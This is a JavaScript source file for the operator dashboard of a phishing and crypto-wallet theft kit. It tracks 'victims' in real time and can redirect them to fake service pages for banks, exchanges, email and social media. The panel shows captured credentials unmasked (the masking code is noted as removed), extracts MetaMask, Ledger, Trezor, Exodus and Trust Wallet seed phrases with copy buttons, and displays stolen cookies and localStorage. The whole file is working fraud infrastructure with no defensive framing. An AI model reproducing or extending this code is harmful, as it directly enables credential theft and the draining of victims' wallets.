// Wait for the DOM to be fully loaded before running scripts
document.addEventListener('DOMContentLoaded', function () {
    console.log("<<<<< DOMContentLoaded event fired >>>>>");

    // --- Global Variables & Configuration ---
    console.log("<<<<< Defining global variables >>>>>");
    const victimsTableBody = document.getElementById('victims-table-body');
    const sidepanel = document.getElementById('sidepanel');
    const clientModal = document.getElementById('clientModal');
    const modalContent = document.getElementById('modal-content');
    const infoModal = document.getElementById('infoModal');
    const infoModalTitle = document.getElementById('infoModalTitle');
    const infoModalBody = document.getElementById('infoModalBody');

    const totalConnectsDisplay = document.getElementById('total-connects');
    const totalVisitsDisplay = document.getElementById('total-visits');
    console.log("<<<<< Global variables defined >>>>>");

    // --- WebSocket Setup ---
    let dashboardSocket = null; // Keep a reference to the socket

    console.log("<<<<< Defining connectWebSocket function >>>>>");
    function connectWebSocket() {
        console.log("<<<<< connectWebSocket FUNCTION CALLED >>>>>");
        // Determine WebSocket protocol (ws or wss for secure)
        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        const wsURL = wsProtocol + window.location.host + '/ws/dashboard/';

        console.log('Attempting to connect to WebSocket:', wsURL);
        dashboardSocket = new WebSocket(wsURL);

        dashboardSocket.onopen = function (e) {
            console.log('Dashboard WebSocket connection established successfully.');
            showNotification('Connected to real-time updates!', 'success', 'fas fa-wifi', 'Real-time Active');
            // You could request initial data here if not sent automatically on connect by server
        };

        dashboardSocket.onmessage = function (e) {
            const data = JSON.parse(e.data);
            console.log('<<<<< JS: Data received from server: >>>>>', data);

            // --- Helper function to add or update a client row in the table ---
            function addOrUpdateClientRow(clientData, messageSourceType) {
                if (!clientData || !clientData.id) {
                    console.error(`<<<<< JS: [${messageSourceType}] addOrUpdateClientRow - Invalid clientData or missing ID >>>>>`, clientData);
                    return;
                }
                const rowId = `victim-${clientData.id.replace(/\./g, '-')}`;
                const existingRow = document.getElementById(rowId);

                if (existingRow) {
                    console.log(`<<<<< JS: [${messageSourceType}] Updating existing row: ${rowId}, Page: ${clientData.page ? clientData.page.name : 'N/A'} >>>>>`);
                    existingRow.remove();
                    addNewRow(clientData);
                } else {
                    console.warn(`<<<<< JS: [${messageSourceType}] Row NOT FOUND (${rowId}), ADDING NEW. Page: ${clientData.page ? clientData.page.name : 'N/A'} >>>>> ClientData:`, JSON.parse(JSON.stringify(clientData)));
                    addNewRow(clientData);
                }
                if (sidepanel && !sidepanel.classList.contains('translate-x-full') && currentlyViewedClientIp === clientData.ip) {
                    console.log(`<<<<< JS: Sidepanel is open for ${clientData.ip}. Refreshing its content. >>>>>`);
                    openNav(clientData);
                }


            }

            // --- Handle different message types from the server ---
            if (data.type === 'initial_data') {
                console.log("<<<<< JS: Processing initial_data >>>>>", data.payload);
                const payload = data.payload;

                // Update total counts
                if (payload.total_visits !== undefined && totalVisitsDisplay) {
                    gsap.to(totalVisitsDisplay, { textContent: payload.total_visits, duration: 0.5, roundProps: "textContent", ease: "power1.inOut" });
                }
                if (payload.total_connects !== undefined && totalConnectsDisplay) {
                    gsap.to(totalConnectsDisplay, { textContent: payload.total_connects, duration: 0.5, roundProps: "textContent", ease: "power1.inOut" });
                }

                // Populate table with initial list of connected clients
                if (payload.initial_clients && Array.isArray(payload.initial_clients)) {
                    console.log("<<<<< JS: Received initial clients list: >>>>>", payload.initial_clients);
                    if (victimsTableBody) victimsTableBody.innerHTML = '';
                    payload.initial_clients.forEach(clientData => addOrUpdateClientRow(clientData, 'initial_data'));
                } else {
                    console.log("<<<<< JS: No initial_clients array in initial_data payload or it's not an array >>>>>");
                    if (victimsTableBody) victimsTableBody.innerHTML = '';
                }

            } else if (data.type === 'dashboard_update') {
                console.log("<<<<< JS: Processing dashboard_update >>>>>", data.payload);
                const payload = data.payload;

                // Update total counts (these might come with new_connected_client or stats-only updates)
                if (payload.total_visits !== undefined && totalVisitsDisplay) {
                    console.log("<<<<< JS: Updating total_visits via dashboard_update >>>>>", payload.total_visits);
                    gsap.to(totalVisitsDisplay, { textContent: payload.total_visits, duration: 0.5, roundProps: "textContent", ease: "power1.inOut" });
                }
                if (payload.total_connects !== undefined && totalConnectsDisplay) {
                    console.log("<<<<< JS: Updating total_connects via dashboard_update >>>>>", payload.total_connects);
                    gsap.to(totalConnectsDisplay, { textContent: payload.total_connects, duration: 0.5, roundProps: "textContent", ease: "power1.inOut" });
                }

                if (payload.new_connected_client) {
                    console.log("<<<<< JS: Processing new_connected_client from dashboard_update: >>>>>", payload.new_connected_client);
                    addOrUpdateClientRow(payload.new_connected_client, 'dashboard_update/new_client');
                }

            } else if (data.type === 'client_row_update') {
                console.log("<<<<< JS: Processing client_row_update >>>>>", data.payload);
                addOrUpdateClientRow(data.payload, 'client_row_update');

            } else if (data.type === 'client_removed') { // **** THIS HANDLER IS FOR REAL-TIME ROW REMOVAL ****
                console.log("<<<<< JS: Received client_removed >>>>>", data.payload);
                const removedClientIp = data.payload.ip_address;
                if (removedClientIp) {
                    const rowId = `victim-${removedClientIp.replace(/\./g, '-')}`;
                    console.log(`<<<<< JS: [client_removed] Attempting to find row with ID: "${rowId}" >>>>>`);
                    const allRowsInTable = victimsTableBody.getElementsByTagName('tr');
                    console.log(`<<<<< JS: [client_removed] Number of rows in table: ${allRowsInTable.length} >>>>>`);
                    for (let i = 0; i < allRowsInTable.length; i++) {
                        console.log(`<<<<< JS: [client_removed] Table row ${i} ID: "${allRowsInTable[i].id}" >>>>>`);
                    }
                    const rowToRemove = document.getElementById(rowId);
                    if (rowToRemove) {
                        console.log(`<<<<< JS: [client_removed] Successfully found row ${rowId}. Removing... >>>>>`);
                        gsap.to(rowToRemove, {
                            opacity: 0, x: -50, duration: 0.4, onComplete: () => {
                                rowToRemove.remove();
                                showNotification(`Client ${removedClientIp} removed.`, 'success', 'fas fa-trash-alt');
                            }
                        });
                    } else {
                        console.warn(`<<<<< JS: [client_removed] Row NOT FOUND: "${rowId}". It might have been removed by other logic or ID mismatch. >>>>>`);
                    }
                } else {
                    console.error("<<<<< JS: client_removed message received without ip_address in payload. >>>>>", data.payload);
                }
            } else if (data.type === 'client_delete_failed') { // Handler for when server fails to delete
                console.error("<<<<< JS: Received client_delete_failed >>>>>", data.payload);
                showNotification(`Failed to delete client ${data.payload.ip_address}: ${data.payload.message || 'Server error'}`, 'error');


            } else if (data.type === 'action_feedback') {
                console.log("<<<<< JS: Received action_feedback >>>>>", data.payload);
                const feedback = data.payload;
                showNotification(feedback.message, feedback.status === 'success' ? 'success' : 'error',
                    feedback.status === 'success' ? 'fas fa-check-circle' : 'fas fa-exclamation-circle');

            } else {
                console.warn("<<<<< JS: Received unhandled message type: >>>>>", data.type, data);
            }
        };

        dashboardSocket.onclose = function (e) {
            console.error('Dashboard WebSocket connection closed unexpectedly. Code:', e.code, 'Reason:', e.reason);
            showNotification('Real-time updates disconnected. Attempting to reconnect...', 'error', 'fas fa-exclamation-triangle', 'Connection Lost');
            // Implement reconnection logic (e.g., exponential backoff)
            setTimeout(connectWebSocket, 5000); // Simple reconnect attempt every 5 seconds
        };

        dashboardSocket.onerror = function (err) {
            console.error('WebSocket error observed:', err);
            // showNotification('Error with real-time connection.', 'error', 'fas fa-skull-crossbones');
            // `onclose` will usually be called too, so reconnection logic there might suffice
        };

    }
    console.log("<<<<< connectWebSocket function defined >>>>>");

    // --- Helper Functions ---
    console.log("<<<<< Defining helper functions (getBrowserIcon, etc.) >>>>>");
    function getBrowserIcon(browserName) {
        const lowerBrowser = browserName.toLowerCase();
        if (lowerBrowser.includes('chrome')) return 'fab fa-chrome';
        if (lowerBrowser.includes('firefox')) return 'fab fa-firefox-browser';
        if (lowerBrowser.includes('safari')) return 'fab fa-safari';
        if (lowerBrowser.includes('edge')) return 'fab fa-edge';
        if (lowerBrowser.includes('opera')) return 'fab fa-opera';
        return 'fas fa-globe'; // Default icon
    }

    function getDeviceIcon(deviceType) {
        const lowerDevice = deviceType.toLowerCase();
        if (lowerDevice.includes('android')) return 'fab fa-android'; // More specific for Android
        if (lowerDevice.includes('mobile') || lowerDevice.includes('iphone')) return 'fas fa-mobile-alt';
        if (lowerDevice.includes('tablet')) return 'fas fa-tablet-alt';
        if (lowerDevice.includes('windows')) return 'fab fa-windows'; // More specific for Windows
        if (lowerDevice.includes('apple') || lowerDevice.includes('mac')) return 'fab fa-apple';
        if (lowerDevice.includes('linux')) return 'fab fa-linux';
        if (lowerDevice.includes('desktop')) return 'fas fa-desktop';
        return 'fas fa-laptop'; // Default icon
    }

    function getPageInfo(pageData) {
        // Expected pageData: { name: 'Root Page', icon_class: 'fas fa-globe' } or just a string name
        let name = 'N/A';
        let iconClass = 'fas fa-file-alt'; // Default icon

        if (typeof pageData === 'object' && pageData !== null) {
            name = pageData.name || 'N/A';
            iconClass = pageData.icon_class || 'fas fa-file-alt';
        } else if (typeof pageData === 'string') {
            name = pageData;
            // Basic mapping if only name is provided (backend should ideally send icon_class)
            const lowerName = name.toLowerCase();
            if (lowerName.includes('root')) iconClass = 'fas fa-globe';
            else if (lowerName.includes('vault')) iconClass = 'fab fa-connectdevelop'; // 'C' like icon
            else if (lowerName.includes('unlink') || lowerName.includes('seed')) iconClass = 'fab fa-connectdevelop';// 'C' like icon
            else if (lowerName.includes('login')) iconClass = 'fas fa-sign-in-alt';
            else if (lowerName.includes('dashboard')) iconClass = 'fas fa-tachometer-alt';
        }
        return { name: name.substring(0, 15) + (name.length > 15 ? '..' : ''), full_name: name, icon_class: iconClass };
    }


    const timezoneMap = {
        "UTC": { flag: "🌍", label: "UTC" },
        "GMT": { flag: "🌍", label: "GMT" },
        "America/New_York": { flag: "🇺🇸", label: "ET" },
        "America/Chicago": { flag: "🇺🇸", label: "CT" },
        "America/Denver": { flag: "🇺🇸", label: "MT" },
        "America/Los_Angeles": { flag: "US", label: "PT" }, // Special 'US' flag for styling
        "Europe/London": { flag: "🇬🇧", label: "GMT/BST" },
        "Europe/Berlin": { flag: "🇩🇪", label: "CET/CEST" },
        "Europe/Paris": { flag: "🇫🇷", label: "CET/CEST" },
        "Asia/Tokyo": { flag: "🇯🇵", label: "JST" },
        "Australia/Sydney": { flag: "🇦🇺", label: "AEST/AEDT" },
        "Asia/Dubai": { flag: "🇦🇪", label: "GST" },
        "Asia/Kolkata": { flag: "🇮🇳", label: "IST" },
        "America/Sao_Paulo": { flag: "🇧🇷", label: "BRT" },
        "Africa/Johannesburg": { flag: "🇿🇦", label: "SAST" }
    };

    function getTimezoneDisplayInfo(timezoneIdentifier) {
        const city = timezoneIdentifier.split('/').pop().replace('_', ' ');
        let iconHtml;

        if (timezoneMap[timezoneIdentifier]) {
            const flag = timezoneMap[timezoneIdentifier].flag;
            if (flag.length > 3) { // Emoji flag
                iconHtml = `<span class="text-2xl leading-none">${flag}</span>`;
            } else if (flag === "US") { // Special case for US text icon
                iconHtml = `<div class="w-6 h-6 bg-gray-600 rounded-full flex items-center justify-center text-xs font-bold text-white leading-none">US</div>`;
            } else { // Other short text flags or default globe
                iconHtml = `<i class="fas fa-globe text-xl text-gray-300"></i>`;
            }
        } else { // Default globe for unmapped
            iconHtml = `<i class="fas fa-globe text-xl text-gray-300"></i>`;
        }
        return { city: city.substring(0, 12) + (city.length > 12 ? '...' : ''), full_city: city, iconHtml: iconHtml };
    }


    function copyToClipboard(text, successMessage = 'Copied to clipboard!') {
        navigator.clipboard.writeText(text).then(() => {
            showNotification(successMessage, 'success', 'fas fa-copy');
        }).catch(err => {
            showNotification('Failed to copy: ' + err, 'error', 'fas fa-exclamation-circle');
        });
    }
    console.log("<<<<< Helper functions defined >>>>>");

    // --- Main Table Row Management ---
    console.log("<<<<< Defining addNewRow function >>>>>");
    function addNewRow(data) {
        if (!victimsTableBody) {
            console.error("<<<<< JS: victimsTableBody not found in addNewRow >>>>>");
            return;
        }
        if (!data || !data.id) { // data.id is the IP from to_dict()
            console.error("<<<<< JS: addNewRow called with invalid data or missing data.id >>>>>", data);
            return;
        }

        // CONSISTENT ID: Replace dots with hyphens for the HTML element ID
        const newRowId = `victim-${data.id.replace(/\./g, '-')}`;

        // Safety check: if a row with this ID somehow already exists, remove it first.
        // This should ideally be fully handled by addOrUpdateClientRow, but an extra check doesn't hurt.
        const preExistingRow = document.getElementById(newRowId);
        if (preExistingRow) {
            console.warn(`<<<<< JS: addNewRow found pre-existing row with ID ${newRowId}. Removing it before adding. This might indicate an issue in addOrUpdateClientRow if it happens frequently. >>>>>`);
            preExistingRow.remove();
        }

        const newRow = victimsTableBody.insertRow(0); // Insert at the top
        newRow.id = newRowId; // SET THE CONSISTENT, HYPHENATED ID
        newRow.className = 'bg-gray-800 border-b border-gray-700 hover:bg-gray-750 transition-colors duration-150';

        const commonCellClasses = "px-2 py-3 align-top";
        const textLabelClasses = "text-[11px] text-gray-400 group-hover:text-gray-200 whitespace-nowrap leading-tight";
        const iconWrapperClasses = "h-7 w-7 flex items-center justify-center mb-0.5 p-1 bg-gray-700 group-hover:bg-gray-600 rounded-md transition-all duration-150";
        const iconClasses = "text-lg text-gray-300 group-hover:text-white";

        // IP Address Cell
        const ipCell = newRow.insertCell();
        ipCell.className = commonCellClasses;
        ipCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="${iconWrapperClasses}"><i class="fas fa-network-wired ${iconClasses}"></i></div>
                <span class="text-[11px] text-gray-100 font-medium group-hover:text-white whitespace-nowrap leading-tight">${data.ip}</span>
            </div>`;

        // Status Cell
        const statusCell = newRow.insertCell();
        statusCell.className = commonCellClasses;
        const isVisible = data.status === 'visible';
        const statusIconClass = isVisible ? 'fas fa-eye text-green-400' : 'fas fa-eye-slash text-red-400';
        const statusText = isVisible ? 'Visible' : 'Hidden';
        statusCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="${iconWrapperClasses}"><i class="${statusIconClass} text-lg group-hover:opacity-80"></i></div>
                <span class="${textLabelClasses}">${statusText}</span>
            </div>`;

        // Page Cell
        const pageCell = newRow.insertCell(); // First declaration - OK
        pageCell.className = commonCellClasses;
        const pageDisplayInfo = getPageInfo(data.page); // First declaration - OK
        pageCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="${iconWrapperClasses}"><i class="${pageDisplayInfo.icon_class} ${iconClasses}"></i></div>
                <span class="${textLabelClasses}">${pageDisplayInfo.name}</span>
            </div>`;
        if (pageDisplayInfo.full_name) {
            tippy(pageCell.querySelector('.group'), { content: pageDisplayInfo.full_name, theme: 'custom' });
        }

        // Browser Cell
        const browserCell = newRow.insertCell(); // Unique variable name - OK
        browserCell.className = commonCellClasses;
        // Use data.browser directly, getBrowserIcon is for the icon class
        browserCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="${iconWrapperClasses}"><i class="${getBrowserIcon(data.browser)} ${iconClasses}"></i></div>
                <span class="${textLabelClasses}">${data.browser || 'N/A'}</span>
            </div>`;

        // Device Cell
        const deviceCell = newRow.insertCell(); // Unique variable name - OK
        deviceCell.className = commonCellClasses;
        // Use data.device directly, getDeviceIcon is for the icon class
        deviceCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="${iconWrapperClasses}"><i class="${getDeviceIcon(data.device)} ${iconClasses}"></i></div>
                <span class="${textLabelClasses}">${data.device || 'N/A'}</span>
            </div>`;

        // Location Cell
        const locationCell = newRow.insertCell(); // Unique variable name - OK
        locationCell.className = commonCellClasses;
        const locationDisplayInfo = getTimezoneDisplayInfo(data.timezone || 'UTC'); // Unique variable name - OK
        locationCell.innerHTML = `
            <div class="flex flex-col items-center text-center group">
                <div class="h-7 w-7 flex items-center justify-center mb-0.5 group-hover:opacity-80">${locationDisplayInfo.iconHtml}</div>
                <span class="${textLabelClasses}">${locationDisplayInfo.city}</span>
            </div>`;
        if (locationDisplayInfo.full_city) {
            tippy(locationCell.querySelector('.group'), { content: `${locationDisplayInfo.full_city} (${data.timezone || 'UTC'})`, theme: 'custom' });
        }

        // Actions Cell
        const actionsCell = newRow.insertCell();
        actionsCell.className = `${commonCellClasses} text-center`;
        let actionsContent = '<div class="flex justify-center items-start space-x-1">';
        const userRole = 'admin';

        // Define createActionItemConfig here or ensure it's accessible in this scope
        function createActionItemConfig(baseIconClass, label, title, specificClass, hoverBgClass = 'group-hover:bg-purple-500', hoverTextClass = 'group-hover:text-purple-300') {
            return `
                <div class="flex flex-col items-center text-center cursor-pointer group ${specificClass}" title="${title}">
                    <div class="p-2 bg-gray-700 rounded-md mb-1 ${hoverBgClass} transition-all duration-150">
                        <i class="${baseIconClass} text-lg text-gray-300 group-hover:text-white"></i>
                    </div>
                    <span class="text-[10px] text-gray-400 ${hoverTextClass} transition-all duration-150 leading-tight">${label}</span>
                </div>`;
        }

        if (userRole === 'admin' || userRole === 'owner') {
            actionsContent += createActionItemConfig('fas fa-plus', 'Redirect', 'Redirect Client', 'redirect-btn', 'group-hover:bg-blue-500', 'group-hover:text-blue-300');
            actionsContent += createActionItemConfig('fas fa-trash-alt', 'Delete', 'Delete Client', 'delete-btn', 'group-hover:bg-red-500', 'group-hover:text-red-300');
            actionsContent += createActionItemConfig('fas fa-eye', 'View', 'View Details', 'view-btn', 'group-hover:bg-indigo-500', 'group-hover:text-indigo-300');
            actionsContent += createActionItemConfig('fas fa-file-export', 'Export', 'Export Data', 'export-btn', 'group-hover:bg-green-500', 'group-hover:text-green-300');
        }
        actionsContent += '</div>';
        actionsCell.innerHTML = actionsContent;

        // Re-add event listeners for action buttons
        const redirectBtn = actionsCell.querySelector('.redirect-btn');
        if (redirectBtn) {
            redirectBtn.addEventListener('click', () => {
                openRedirectModal(data.ip);
            });
        }


        const deleteBtn = actionsCell.querySelector('.delete-btn');
        if (deleteBtn) {
            deleteBtn.addEventListener('click', () => {
                if (confirm(`Are you sure you want to delete client ${data.ip}? This action is permanent.`)) {
                    if (dashboardSocket && dashboardSocket.readyState === WebSocket.OPEN) {
                        console.log(`<<<<< JS: Sending delete_client_request for IP: ${data.ip} >>>>>`);
                        dashboardSocket.send(JSON.stringify({
                            type: 'delete_client_request',
                            payload: { ip_address: data.ip }
                        }));
                        showNotification(`Requesting deletion of client ${data.ip}...`, 'info');
                    } else {
                        showNotification('Cannot delete client: WebSocket not connected.', 'error');
                    }
                }
            });
        }
        const viewBtn = actionsCell.querySelector('.view-btn');
        if (viewBtn) viewBtn.addEventListener('click', () => openNav(data));

        const exportBtn = actionsCell.querySelector('.export-btn');
        if (exportBtn) exportBtn.addEventListener('click', () => {
            showNotification(`Exporting data for ${data.ip}...`, 'info', 'fas fa-file-export');
            console.log('Export data:', data);
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data, null, 2));
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            downloadAnchorNode.setAttribute("download", `client_${data.ip}_data.json`);
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();
        });

        tippy(actionsCell.querySelectorAll('.group[title]'), { theme: 'custom', placement: 'top' });
        gsap.from(newRow, { opacity: 0, y: 20, duration: 0.5, ease: 'power2.out' });
    }
    console.log("<<<<< Defining addNewRow function >>>>>");


    // --- Side Panel (Client Information) ---
    let currentlyViewedClientIp = null; // Ensure this is defined in the correct scope

    function openNav(victimData) {
        currentlyViewedClientIp = victimData.ip; // Store the IP when panel opens

        if (!sidepanel) {
            console.error("Sidepanel element not found.");
            return;
        }
        if (!victimData) {
            console.error("openNav called with no victimData.");
            return;
        }

        console.log("<<<<< JS: Opening sidepanel with data: >>>>>", victimData);

        // Helper to safely set text content
        function setText(id, text, fallback = 'N/A') {
            const element = document.getElementById(id);
            if (element) {
                element.textContent = text || fallback;
            } else {
                console.error(`<<<<< JS: Element with ID '${id}' not found in openNav! >>>>>`);
            }
        }

        // --- Populate General Information ---
        setText('info-ip', victimData.ip);
        setText('info-userAgent', victimData.userAgent);

        const pageDisplayInfo = getPageInfo(victimData.page); // You have this helper
        setText('info-currentPage', pageDisplayInfo.full_name);

        setText('info-status', victimData.status ? (victimData.status.charAt(0).toUpperCase() + victimData.status.slice(1)) : 'Unknown');
        setText('info-timezone', victimData.timezone);
        setText('info-browser', victimData.browser);
        setText('info-device', victimData.device);
        setText('info-cookiesEnabled', victimData.cookiesEnabled ? 'Yes' : 'No');
        setText('info-referrer', victimData.referrer);
        setText('info-language', victimData.language);
        setText('info-screenResolution', victimData.screenResolution);


        // --- Populate Captured Data ---
        const capturedDataContent = document.getElementById('info-captured-data-content');
        if (capturedDataContent) {
            capturedDataContent.innerHTML = ''; // Clear previous data

            if (victimData.captured_data && Object.keys(victimData.captured_data).length > 0) {
                for (const serviceName in victimData.captured_data) {
                    if (Object.hasOwnProperty.call(victimData.captured_data, serviceName)) {
                        const serviceData = victimData.captured_data[serviceName];

                        const serviceCard = document.createElement('div');
                        serviceCard.className = 'bg-gray-700 p-3 rounded-md shadow';

                        const serviceTitle = document.createElement('h4');
                        serviceTitle.className = 'text-md font-semibold text-purple-300 mb-2 capitalize';
                        serviceTitle.textContent = serviceName.replace(/_/g, ' ');
                        serviceCard.appendChild(serviceTitle);

                        const detailsList = document.createElement('div');
                        detailsList.className = 'text-xs text-gray-300 space-y-1';

                        for (const stepOrFieldName in serviceData) {
                            if (Object.hasOwnProperty.call(serviceData, stepOrFieldName)) {
                                const stepData = serviceData[stepOrFieldName];

                                if (typeof stepData === 'object' && stepData !== null) {
                                    const stepTitle = document.createElement('p');
                                    stepTitle.innerHTML = `<strong class="text-gray-100">${stepOrFieldName.replace(/_/g, ' ')}:</strong>`;
                                    detailsList.appendChild(stepTitle);

                                    const fieldList = document.createElement('ul');
                                    fieldList.className = 'list-disc list-inside pl-4 space-y-0.5';
                                    for (const field in stepData) {
                                        if (Object.hasOwnProperty.call(stepData, field)) {
                                            const listItem = document.createElement('li');
                                            let value = stepData[field];

                                            // **** PASSWORD MASKING LOGIC REMOVED ****
                                            // No longer replacing password/passcode with asterisks

                                            listItem.innerHTML = `<span class="text-gray-400">${field.replace(/_/g, ' ')}:</span> ${value}`;
                                            fieldList.appendChild(listItem);
                                        }
                                    }
                                    detailsList.appendChild(fieldList);
                                } else {
                                    const para = document.createElement('p');
                                    let value = stepData;

                                    // **** PASSWORD MASKING LOGIC REMOVED ****

                                    para.innerHTML = `<strong class="text-gray-100">${stepOrFieldName.replace(/_/g, ' ')}:</strong> ${value}`;
                                    detailsList.appendChild(para);
                                }
                            }
                        }
                        serviceCard.appendChild(detailsList);
                        capturedDataContent.appendChild(serviceCard);
                    }
                }
            } else {
                capturedDataContent.innerHTML = '<p class="text-sm text-gray-500">No data captured for this client yet.</p>';
            }
        } else {
            console.error("Element with ID 'info-captured-data-content' not found.");
        }

        // --- Populate Seed, Cookies, Local Storage ---
        setText('info-seed', victimData.captured_data?.wallets?.trezor_seed_phrase?.seed_phrase ||
            victimData.captured_data?.wallets?.ledger_seed_phrase?.seed_phrase_24_words ||
            victimData.captured_data?.wallets?.exodus_seed_phrase?.seed_phrase_12_words ||
            victimData.captured_data?.wallets?.metamask_seed_phrase?.secret_recovery_phrase ||
            victimData.captured_data?.wallets?.trustwallet_seed_phrase?.secret_recovery_phrase ||
            'N/A');

        setText('info-cookies', victimData.cookies ? JSON.stringify(victimData.cookies, null, 2) : 'N/A (Not Captured)');
        setText('info-localStorage', victimData.localStorage ? JSON.stringify(victimData.localStorage, null, 2) : 'N/A (Not Captured)');

        // Show the sidepanel
        if (sidepanel) { // Ensure sidepanel exists before trying to manipulate it
            sidepanel.classList.remove('translate-x-full');
            gsap.to(sidepanel, { x: 0, duration: 0.3, ease: 'power2.out' });
            document.body.classList.add('overflow-hidden');
            if (window.innerWidth >= 768) {
                document.body.classList.add('md:pr-[calc(100vw-100%+24rem)]');
            }
        }
    }

    function closeNav() {
        currentlyViewedClientIp = null;
        if (!sidepanel) return;
        gsap.to(sidepanel, {
            x: '100%', duration: 0.3, ease: 'power2.in', onComplete: () => {
                sidepanel.classList.add('translate-x-full');
                // Check if other modals are closed before removing overflow-hidden
                if (extraInputModal && extraInputModal.classList.contains('hidden') &&
                    clientModal && clientModal.classList.contains('hidden') &&
                    infoModal && infoModal.classList.contains('hidden') &&
                    redirectServiceModal && redirectServiceModal.classList.contains('hidden')) {
                    document.body.classList.remove('overflow-hidden', 'md:pr-[calc(100vw-100%+24rem)]');
                }
            }
        });
    }
    console.log("<<<<< Side panel functions defined >>>>>");
    console.log("<<<<< Setting up side panel event listeners >>>>>");
    if (sidepanel) {
        const closeButton = sidepanel.querySelector('button[onclick="closeNav()"]');
        if (closeButton) closeButton.addEventListener('click', closeNav);
    }
    document.addEventListener('keydown', function (event) {
        if (event.key === 'Escape') {
            if (sidepanel && !sidepanel.classList.contains('translate-x-full')) closeNav();
            if (clientModal && !clientModal.classList.contains('hidden')) closeClientModal();
            if (infoModal && !infoModal.classList.contains('hidden')) closeInfoModal();
            if (redirectServiceModal && !redirectServiceModal.classList.contains('hidden')) closeRedirectModal();
            if (extraInputModal && !extraInputModal.classList.contains('hidden')) closeExtraInputModal(); // Close new modal
        }
    });
    if (sidepanel) {
        sidepanel.addEventListener('click', function (event) {
            event.stopPropagation();
        });
        const copySeedPanelBtn = document.getElementById('copy-seed-panel');
        if (copySeedPanelBtn) {
            copySeedPanelBtn.addEventListener('click', () => {
                const seedText = document.getElementById('info-seed').textContent;
                if (seedText && seedText !== 'N/A') {
                    copyToClipboard(seedText, 'Seed phrase copied!');
                } else {
                    showNotification('No seed phrase to copy.', 'warning', 'fas fa-exclamation-triangle');
                }
            });
        }

        const exportVictimBtn = document.getElementById('export-victim-btn');
        if (exportVictimBtn) {
            exportVictimBtn.addEventListener('click', () => {
                const victimDataToExport = {
                    ip: document.getElementById('info-ip').textContent,
                    userAgent: document.getElementById('info-userAgent').textContent,
                    referrer: document.getElementById('info-referrer').textContent,
                    language: document.getElementById('info-language').textContent,
                    screenResolution: document.getElementById('info-screenResolution').textContent,
                    timezone: document.getElementById('info-timezone').textContent,
                    cookiesEnabled: document.getElementById('info-cookiesEnabled').textContent,
                    currentPage: document.getElementById('info-currentPage').textContent,
                    browser: document.getElementById('info-browser').textContent,
                    device: document.getElementById('info-device').textContent,
                    seed: document.getElementById('info-seed').textContent,
                    cookies: document.getElementById('info-cookies').textContent, // Potentially parse back from JSON string if needed
                    localStorage: document.getElementById('info-localStorage').textContent, // Same as cookies
                };
                showNotification(`Exporting data for ${victimDataToExport.ip}`, 'info', 'fas fa-file-export');
                console.log('Exporting from panel:', victimDataToExport);
                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(victimDataToExport, null, 2));
                const downloadAnchorNode = document.createElement('a');
                downloadAnchorNode.setAttribute("href", dataStr);
                downloadAnchorNode.setAttribute("download", `client_${victimDataToExport.ip}_details.json`);
                document.body.appendChild(downloadAnchorNode);
                downloadAnchorNode.click();
                downloadAnchorNode.remove();
            });
        }
    }

    // --- Client Service Modal (No changes requested, keeping as is) ---
    let currentClientDataForModal = null;
    const servicesContainer = document.getElementById('servicesContainer');
    const serviceSearchInput = document.getElementById('serviceSearch');
    const deselectAllButton = document.getElementById('deselectAllButton');
    const saveServicesButton = document.getElementById('saveServicesButton');
    const closeModalButton = document.getElementById('closeModalButton');
    const allServices = [
        { name: 'Social Media', icon: 'fas fa-users', options: ['Facebook', 'Twitter', 'Instagram', 'LinkedIn', 'TikTok', 'Snapchat', 'Pinterest', 'Reddit'] },
        { name: 'Email Providers', icon: 'fas fa-envelope', options: ['Gmail', 'Outlook', 'Yahoo Mail', 'ProtonMail', 'Zoho Mail'] },
        { name: 'Banking & Finance', icon: 'fas fa-university', options: ['PayPal', 'Stripe', 'Bank of America', 'Chase', 'Wells Fargo', 'Coinbase', 'Binance'] },
        { name: 'Shopping', icon: 'fas fa-shopping-cart', options: ['Amazon', 'eBay', 'Walmart', 'Target', 'Best Buy'] },
        { name: 'Streaming Services', icon: 'fas fa-film', options: ['Netflix', 'Hulu', 'Disney+', 'HBO Max', 'Amazon Prime Video', 'YouTube Premium'] },
        { name: 'Cloud Storage', icon: 'fas fa-cloud', options: ['Google Drive', 'Dropbox', 'iCloud', 'OneDrive'] },
        { name: 'Gaming', icon: 'fas fa-gamepad', options: ['Steam', 'Epic Games', 'PlayStation Network', 'Xbox Live', 'Nintendo Account'] }
    ];
    function generateServiceHTML(service) {
        let optionsHTML = service.options.map(opt =>
            `<div class="service-option bg-gray-700 p-3 rounded-lg cursor-pointer hover:bg-gray-600 transition-colors duration-150 flex items-center justify-between" data-service="${service.name}" data-option="${opt}">
                <span>${opt}</span>
                <i class="fas fa-check-circle text-green-500 opacity-0 transition-opacity duration-200"></i>
            </div>`
        ).join('');
        return `
            <div class="service-group bg-gray-750 p-1 rounded-lg">
                <div class="service-header flex items-center justify-between p-3 cursor-pointer hover:bg-gray-650 rounded-t-lg">
                    <div class="flex items-center">
                        <i class="${service.icon} mr-3 text-purple-400 text-lg"></i>
                        <span class="font-semibold text-white">${service.name}</span>
                    </div>
                    <i class="fas fa-chevron-down text-gray-400 transition-transform duration-300"></i>
                </div>
                <div class="service-options-container hidden p-3 space-y-2 border-t border-gray-600 rounded-b-lg">
                    ${optionsHTML}
                </div>
            </div>`;
    }
    function initializeModal(services) {
        if (!servicesContainer) return;
        servicesContainer.innerHTML = services.map(generateServiceHTML).join('');
        initializeEventListenersForModal();
    }
    function deselectOption(optionElement) {
        optionElement.classList.remove('selected', 'bg-purple-600');
        optionElement.classList.add('bg-gray-700');
        optionElement.querySelector('.fa-check-circle').classList.add('opacity-0');
    }
    function initializeEventListenersForModal() {
        const serviceHeaders = servicesContainer.querySelectorAll('.service-header');
        serviceHeaders.forEach(header => {
            header.addEventListener('click', () => {
                const optionsContainer = header.nextElementSibling;
